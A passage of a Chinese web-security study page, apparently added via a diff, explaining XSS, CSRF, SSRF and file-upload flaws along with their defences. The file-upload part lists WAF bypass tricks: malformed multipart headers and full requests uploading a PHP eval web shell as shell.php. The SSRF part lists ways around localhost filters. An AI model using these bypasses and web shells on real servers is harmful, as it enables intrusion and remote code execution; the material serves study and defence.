+​	4.XSS蠕虫。
+​	5.获取用户浏览器信息。
+​	6.利用XSS漏洞扫描用户内网。</p>
+<h4 id="4防御" class="headerLink">
+    <a href="#4%e9%98%b2%e5%be%a1" class="header-mark"></a>1.0.22 4.防御：</h4><p>**总体思路:**对用户输入进行过滤,对输出进行编码</p>
+<p>1.对用户输入进行XSS防御方式有2种:基于黑名单的过滤和基于白名单的过滤. 而白名单相对来说更安全;</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">黑名单:只规定哪些数据不能被输入,很可能被绕过;比如对 &#39; &#34; &lt;&gt; 等进行过滤
+</span></span><span class="line"><span class="cl">白名单:只定义哪些数据正常才能被提交;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>2.设置http-only参数为true,这样JS就不能读取cookie信息了;(特殊常见可能被绕过)
+3.使用一些函数进行防御
+4.不要随意打开一些来历不明的网站或链接</p>
+<h4 id="5如何快速判定xss类型" class="headerLink">
+    <a href="#5%e5%a6%82%e4%bd%95%e5%bf%ab%e9%80%9f%e5%88%a4%e5%ae%9axss%e7%b1%bb%e5%9e%8b" class="header-mark"></a>1.0.23 5.如何快速判定XSS类型？</h4><p>存储型XSS：
+发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码；</p>
+<p>反射型XSS：
+发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码；</p>
+<p>DOM型XSS：
+发送一次带XSS代码的请求，在返回包里没有XSS代码；</p>
+<h4 id="6存储型xss怎么利用" class="headerLink">
+    <a href="#6%e5%ad%98%e5%82%a8%e5%9e%8bxss%e6%80%8e%e4%b9%88%e5%88%a9%e7%94%a8" class="header-mark"></a>1.0.24 6.存储型XSS怎么利用</h4><p>XSS攻击的原理是通过修改或者添加页面上的JavaScript恶意脚本，在浏览器渲染页面的时 候执行该脚本，从而实现窃取COOKIE或者调用Ajax实现其他类型的CSRF攻击，还可以插入 beef进行钓鱼等</p>
+<h4 id="7cors浏览器同源策略" class="headerLink">
+    <a href="#7cors%e6%b5%8f%e8%a7%88%e5%99%a8%e5%90%8c%e6%ba%90%e7%ad%96%e7%95%a5" class="header-mark"></a>1.0.25 7.CORS（浏览器同源策略）</h4><p>js =&gt;ajax 去请求其他网站的东西 test.com 根据浏览器的CORS策略 他只能在test.com里面请求东西 test.com 调用ajax 去访问 xxxx.com assdasd.test.com 如果目标的CORS头 默 认不放行test.com 这样 test.com 的ajax请求就不会访问其他网站</p>
+<h4 id="8xss绕过waf总结" class="headerLink">
+    <a href="#8xss%e7%bb%95%e8%bf%87waf%e6%80%bb%e7%bb%93" class="header-mark"></a>1.0.26 8.XSS绕过waf总结</h4><ol>
+<li>Script 标签</li>
+<li>JavaScript 事件</li>
+<li>行内样式(Inlinestyle)</li>
+<li>CSS import</li>
+<li>Javascript URL</li>
+<li>利用字符编码</li>
+<li>绕过长度限制</li>
+<li>超文本内容</li>
+<li>变形主要包含大小写和JavaScript变形</li>
+</ol>
+<h2 id="03-csrf漏洞" class="headerLink">
+    <a href="#03-csrf%e6%bc%8f%e6%b4%9e" class="header-mark"></a>2 03-csrf漏洞</h2><h4 id="1原理-2" class="headerLink">
+    <a href="#1%e5%8e%9f%e7%90%86-2" class="header-mark"></a>2.0.27 1.原理：</h4><p>​	当黑客发现某网站存在CSRF漏洞，并且构造攻击参数将payload制作成网页，用户访问存在CSRF漏洞的网站，并且登录到后台，获取cookie，此时黑客发送带有payload的网址给用户，用户同时打开黑客所发来的网址，执行了payload，则造成了一次CSRF攻击</p>
+<h4 id="2形成原因" class="headerLink">
+    <a href="#2%e5%bd%a2%e6%88%90%e5%8e%9f%e5%9b%a0" class="header-mark"></a>2.0.28 2.形成原因：</h4><p>​	主要是漏洞网站没有经过二次验证，和用户在浏览漏洞网站的时候，同时点击了hack制造的payload</p>
+<h4 id="3如何防止-csrf" class="headerLink">
+    <a href="#3%e5%a6%82%e4%bd%95%e9%98%b2%e6%ad%a2-csrf" class="header-mark"></a>2.0.29 3.如何防止 CSRF?</h4><p>1.验证 referer
+2.验证 token</p>
+<h4 id="4csrf成功利用的条件" class="headerLink">
+    <a href="#4csrf%e6%88%90%e5%8a%9f%e5%88%a9%e7%94%a8%e7%9a%84%e6%9d%a1%e4%bb%b6" class="header-mark"></a>2.0.30 4.csrf成功利用的条件</h4><p>1- 用户在统一浏览器下
+2- 没有关闭浏览器的情况下
+3- 访问了攻击者精心伪装好的恶意链接</p>
+<h4 id="5xss和csrf的区别" class="headerLink">
+    <a href="#5xss%e5%92%8ccsrf%e7%9a%84%e5%8c%ba%e5%88%ab" class="header-mark"></a>2.0.31 5.XSS和CSRF的区别</h4><ol>
+<li>
+<p>xss是单一网站不需要登录就能获取cookie,csrf是有一个漏洞网站,和一个攻击网站需要先登录漏洞网站</p>
+</li>
+<li>
+<p>xss是向网站注入js代码,执行js代码.csrf利用网站本身漏洞去执行网站功能</p>
+</li>
+<li>
+<p>CSRF比XSS漏洞危害更高。</p>
+</li>
+<li>
+<p>CSRF可以做到的事情，XSS都可以做到。</p>
+</li>
+<li>
+<p>XSS有局限性，而CSRF没有局限性。</p>
+</li>
+<li>
+<p>XSS针对客户端，而CSRF针对服务端。</p>
+</li>
+<li>
+<p>XSS是利用合法用户获取其信息，而CSRF是伪造成合法用户发起请求。</p>
+</li>
+</ol>
+<h2 id="04-ssrf漏洞" class="headerLink">
+    <a href="#04-ssrf%e6%bc%8f%e6%b4%9e" class="header-mark"></a>3 04-ssrf漏洞</h2><h4 id="1原理-3" class="headerLink">
+    <a href="#1%e5%8e%9f%e7%90%86-3" class="header-mark"></a>3.0.32 1.原理</h4><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统</p>
+<p>1）服务器允许向其他服务器获取资源
+2）但是并没有对该地址做严格的过滤和限制
+3）所以导致了攻击者可以向受害者服务器，传入任意的URL 地址，并将数据返回</p>
+<h4 id="2防御" class="headerLink">
+    <a href="#2%e9%98%b2%e5%be%a1" class="header-mark"></a>3.0.33 2.防御：</h4><p>1.限制请求的端口为 HTTP 常用的端口，比如 80,443,8080,8088 等
+2.黑名单内网 IP。
+3.禁用不需要的协议，仅仅允许 HTTP 和 HTTPS</p>
+<h4 id="3ssrf-禁用-127001-后如何绕过支持哪些协议" class="headerLink">
+    <a href="#3ssrf-%e7%a6%81%e7%94%a8-127001-%e5%90%8e%e5%a6%82%e4%bd%95%e7%bb%95%e8%bf%87%e6%94%af%e6%8c%81%e5%93%aa%e4%ba%9b%e5%8d%8f%e8%ae%ae" class="header-mark"></a>3.0.34 3.SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？</h4><p>(1)利用进制转换
+(2)利用DNS解析
+(3)利用句号<code>（127。0。0。1）</code>
+(4)利用<code>[::]（http://[::]:80/）</code>
+(5)利用<code>@（http://example.com@127.0.0.1）</code>
+(6)利用短地址<code>（http://dwz.cn/11SMa）</code>
+(7)协议<code>（Dict://、SFTP://、TFTP://、LDAP://、Gopher://）</code></p>
+<h4 id="4漏洞存在的地方" class="headerLink">
+    <a href="#4%e6%bc%8f%e6%b4%9e%e5%ad%98%e5%9c%a8%e7%9a%84%e5%9c%b0%e6%96%b9" class="header-mark"></a>3.0.35 4.漏洞存在的地方：</h4><p>1.能够对外发起网络请求的地方
+2.请求远程服务器资源的地方
+3.数据库内置功能
+4.邮件系统
+5.文件处理
+6.在线处理工具</p>
+<p><a href="https://xz.aliyun.com/t/11215" target="_blank" rel="noopener noreferrer">https://xz.aliyun.com/t/11215</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/346220565" target="_blank" rel="noopener noreferrer">https://zhuanlan.zhihu.com/p/346220565</a></p>
+<p><a href="https://www.buaq.net/go-66428.html" target="_blank" rel="noopener noreferrer">https://www.buaq.net/go-66428.html</a></p>
+<h2 id="05-文件上传漏洞" class="headerLink">
+    <a href="#05-%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%e6%bc%8f%e6%b4%9e" class="header-mark"></a>4 05-文件上传漏洞：</h2><h4 id="1文件上传原理" class="headerLink">
+    <a href="#1%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%e5%8e%9f%e7%90%86" class="header-mark"></a>4.0.36 1.文件上传原理</h4><ol>
+<li>用户在 Web 页面上选择要上传的文件，并提交表单。</li>
+<li>浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。</li>
+<li>Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。</li>
+<li>服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。</li>
+<li>如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。</li>
+<li>服务器返回上传结果给客户端，告知用户文件是否上传成功。</li>
+</ol>
+<h4 id="2漏洞原理" class="headerLink">
+    <a href="#2%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86" class="header-mark"></a>4.0.37 2.漏洞原理：</h4><p>由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器.</p>
+<h4 id="3攻击特征" class="headerLink">
+    <a href="#3%e6%94%bb%e5%87%bb%e7%89%b9%e5%be%81" class="header-mark"></a>4.0.38 3.攻击特征</h4><p>文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录</p>
+<h4 id="4需满足条件" class="headerLink">
+    <a href="#4%e9%9c%80%e6%bb%a1%e8%b6%b3%e6%9d%a1%e4%bb%b6" class="header-mark"></a>4.0.39 4.需满足条件</h4><p>首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功</p>
+<h4 id="5数据包中可修改的地方" class="headerLink">
+    <a href="#5%e6%95%b0%e6%8d%ae%e5%8c%85%e4%b8%ad%e5%8f%af%e4%bf%ae%e6%94%b9%e7%9a%84%e5%9c%b0%e6%96%b9" class="header-mark"></a>4.0.40 5.数据包中可修改的地方</h4><ul>
+<li>Content-Disposition 一般可以更改 name 表单参数值.</li>
+<li>不能更改filename :文件名</li>
+<li>可以更改Content-Type:文件MIME</li>
+<li>视情况更改boundary:内容划分,可以更改</li>
+</ul>
+<h4 id="6waf如何拦截恶意文件" class="headerLink">
+    <a href="#6waf%e5%a6%82%e4%bd%95%e6%8b%a6%e6%88%aa%e6%81%b6%e6%84%8f%e6%96%87%e4%bb%b6" class="header-mark"></a>4.0.41 6.waf如何拦截恶意文件</h4><ul>
+<li>文件名:解析文件名,判断是否在黑名单内</li>
+<li>文件内容:解析文件内容,判断是否为webshell</li>
+<li>文件目录权限:这个由主机waf实现</li>
+</ul>
+<ol>
+<li>获取Request Header中Content-Type的boundary值</li>
+<li>根据boundary值,解析post数据,获取文件名</li>
+<li>判断文件名是否在拦截黑名单/白名单之外</li>
+</ol>
+<h4 id="7绕过" class="headerLink">
+    <a href="#7%e7%bb%95%e8%bf%87" class="header-mark"></a>4.0.42 7.绕过</h4><h5 id="黑名单绕过" class="headerLink">
+    <a href="#%e9%bb%91%e5%90%8d%e5%8d%95%e7%bb%95%e8%bf%87" class="header-mark"></a>4.0.42.1 黑名单绕过</h5><p>a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等
+b.上传.htacess
+c.pHp大小写变换
+d.在数据包中 后文件缀名前加空格
+e.后缀名前加.
+f.加上::$DATA
+g.未循环验证，可以使用x.php…类似的方法</p>
+<h5 id="白名单绕过" class="headerLink">
+    <a href="#%e7%99%bd%e5%90%8d%e5%8d%95%e7%bb%95%e8%bf%87" class="header-mark"></a>4.0.42.2 白名单绕过</h5><p>（一般需要配合其他漏洞一起利用）
+a.%00截断
+在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。
+%00适用于php&gt;5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断
+（magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误）</p>
+<h5 id="字符变异" class="headerLink">
+    <a href="#%e5%ad%97%e7%ac%a6%e5%8f%98%e5%bc%82" class="header-mark"></a>4.0.42.3 字符变异</h5><h6 id="引号变换" class="headerLink">
+    <a href="#%e5%bc%95%e5%8f%b7%e5%8f%98%e6%8d%a2" class="header-mark"></a>4.0.42.3.1 引号变换</h6><p>头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Content-Disposition: &#34;form-data&#34;; name=file_x; filename=&#34;xx.php&#34;
+</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;file_x&#34;; filename=&#34;xx.php
+</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;file_x&#34;; filename=&#39;xx.php
+</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;file_x&#34;; filename=&#34;xx.php;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h6 id="大小写变换" class="headerLink">
+    <a href="#%e5%a4%a7%e5%b0%8f%e5%86%99%e5%8f%98%e6%8d%a2" class="header-mark"></a>4.0.42.3.2 大小写变换</h6><p>对关键字符进行大小写转换 Content-Disposition  name  filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition</p>
+<h6 id="添加换行符" class="headerLink">
+    <a href="#%e6%b7%bb%e5%8a%a0%e6%8d%a2%e8%a1%8c%e7%ac%a6" class="header-mark"></a>4.0.42.3.3 添加换行符</h6><p>字符值与等号之间可以加入换行符,依然可以正常上传,如使用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Content-Disposition: &#34;form-data&#34;; name=&#34;file_x&#34;; filename=[0x09]&#34;xx.php&#34;
+</span></span><span class="line"><span class="cl">Content-Disposition: &#34;form-data&#34;; name=&#34;file_x&#34;; filename=[0x09]&#34;xx.php
+</span></span><span class="line"><span class="cl">Content-Disposition: &#34;form-data&#34;; name=&#34;file_x&#34;; filename=[0x09]&#34;xx.php&#34;[0x09]
+</span></span><span class="line"><span class="cl">Content-Disposition: &#34;form-data&#34;; name=&#34;file_x&#34;; filename=[0x09]xx.php[0x09];
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h6 id="多个分号" class="headerLink">
+    <a href="#%e5%a4%9a%e4%b8%aa%e5%88%86%e5%8f%b7" class="header-mark"></a>4.0.42.3.4 多个分号</h6><p>文件解析时,可能因为分号解析不到文件名,导致绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;file_x&#34;;;; filename=&#34;test.php&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h6 id="多个等号" class="headerLink">
+    <a href="#%e5%a4%9a%e4%b8%aa%e7%ad%89%e5%8f%b7" class="header-mark"></a>4.0.42.3.5 多个等号</h6><p>在post中的内容中使用多个等号对文件上传没有影响</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Content-Disposition: form-data; name==&#34;file_x&#34;; filename====&#34;test.php&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="变换content-disposition的值" class="headerLink">
+    <a href="#%e5%8f%98%e6%8d%a2content-disposition%e7%9a%84%e5%80%bc" class="header-mark"></a>4.0.42.4 变换Content-Disposition的值</h5><p>在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Content-Disposition: fOrM-DaTA; name=&#34;file_x&#34;; filename=&#34;xx.php&#34;
+</span></span><span class="line"><span class="cl">Content-Disposition: form-da+ta; name=&#34;file_x&#34;; filename=&#34;xx.php&#34;
+</span></span><span class="line"><span class="cl">Content-Disposition: fo    r m-dat a; name=&#34;file_x&#34;; filename=&#34;xx.php&#34;
+</span></span><span class="line"><span class="cl">Content-Disposition: form-dataxx; name=&#34;file_x&#34;; filename=&#34;xx.php&#34;
+</span></span><span class="line"><span class="cl">Content-Disposition: name=&#34;file_x&#34;; filename=&#34;xx.php&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h6 id="畸形的boundary头部" class="headerLink">
+    <a href="#%e7%95%b8%e5%bd%a2%e7%9a%84boundary%e5%a4%b4%e9%83%a8" class="header-mark"></a>4.0.42.4.1 畸形的boundary头部</h6><p>boundary可以变换为如下形式,且不影响上传</p>
+<p><strong>multipart/form-data大小写变换</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111
+</span></span><span class="line"><span class="cl">Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111
+</span></span><span class="line"><span class="cl">Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111
+</span></span><span class="line"><span class="cl">Content-Type: multipart/form-data a\|/?!@#$%^() boundary=----WebKitFormBoundarye111
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111
+</span></span><span class="line"><span class="cl">Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111
+</span></span><span class="line"><span class="cl">Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111
+</span></span><span class="line"><span class="cl">Content-Type: multipart/form-data,a\|/?!@#$%^(),boundary=----WebKitFormBoundarye111
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>boundary之前可以直接加入任何值(php可行)</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Content-Type: multipart/form-data;bypass&amp;123**{|}boundary=----WebKitFormBoundarye111
+</span></span><span class="line"><span class="cl">Content-Type: multipart/form-data bypass&amp;123**{|}boundary=----WebKitFormBoundarye111
+</span></span><span class="line"><span class="cl">Content-Type: multipart/form-data,bypass&amp;123**{|}boundary=----WebKitFormBoundarye111
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>boundary末尾可以使用逗号或者分号隔开插入任何值</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc
+</span></span><span class="line"><span class="cl">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h6 id="顺序颠倒" class="headerLink">
+    <a href="#%e9%a1%ba%e5%ba%8f%e9%a2%a0%e5%80%92" class="header-mark"></a>4.0.42.4.2 顺序颠倒</h6><p>交换name和filename的顺序</p>
+<p>因为规定了Content-Disposition必须在最前面,所以只能交换name和filename的顺序.有的waf可能会匹配name在前面,filename在后面,可以导致绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Content-Disposition: form-data; filename=&#34;xx.php&#34;; name=&#34;file_x&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>交换Content-Disposition和Content-Type的顺序</p>
+<p>Content-Disposition和Content-Type也是能够交换顺序的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">image</span><span class="o">/</span><span class="n">png</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;upload_file&#34;</span><span class="p">;</span> <span class="n">filename</span><span class="o">=</span><span class="s2">&#34;shell.php&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>交换不同boundary内容的顺序</p>
+<p>不同boundary内容也能够交换,且不影响文件上传</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundaryzEHC1GyG8wYOH1rf</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;submit&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">上传</span>
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundaryzEHC1GyG8wYOH1rf</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;upload_file&#34;</span><span class="p">;</span> <span class="n">filename</span><span class="o">=</span><span class="s2">&#34;shell.php&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">image</span><span class="o">/</span><span class="n">png</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="err">@</span><span class="n">eval</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]);</span><span class="err">?</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundaryzEHC1GyG8wYOH1rf</span><span class="o">--</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h6 id="内容重复" class="headerLink">
+    <a href="#%e5%86%85%e5%ae%b9%e9%87%8d%e5%a4%8d" class="header-mark"></a>4.0.42.4.3 内容重复</h6><p><strong>boundary内容重复</strong></p>
+<p>最后上传的文件是shell.php而非shell.jpg,但是如果取的文件名时只取了第一个就会被Bypass</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundarymeEzpUTMsmOfjwAA</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;upload_file&#34;</span><span class="p">;</span> <span class="n">filename</span><span class="o">=</span><span class="s2">&#34;shell.jpg&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">image</span><span class="o">/</span><span class="n">png</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="err">@</span><span class="n">eval</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;hack&#39;</span><span class="p">]);</span> <span class="err">?</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundarymeEzpUTMsmOfjwAA</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;upload_file&#34;</span><span class="p">;</span> <span class="n">filename</span><span class="o">=</span><span class="s2">&#34;shell.php&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">image</span><span class="o">/</span><span class="n">png</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="err">@</span><span class="n">eval</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;hack&#39;</span><span class="p">]);</span> <span class="err">?</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundarymeEzpUTMsmOfjwAA</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;submit&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">上传</span>
